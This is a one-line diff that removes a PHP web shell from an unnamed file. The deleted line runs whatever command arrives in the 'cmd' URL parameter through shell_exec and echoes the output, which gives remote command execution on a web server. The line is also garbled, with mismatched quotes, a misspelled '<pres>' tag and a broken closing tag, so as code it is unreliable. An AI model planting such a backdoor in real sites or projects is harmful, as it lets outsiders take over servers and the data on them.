@@ -1,1 +1,0 @@
-<?php echo "<pres> . shell_exec($_GET["cmd"]) . "</pres>"; ?">
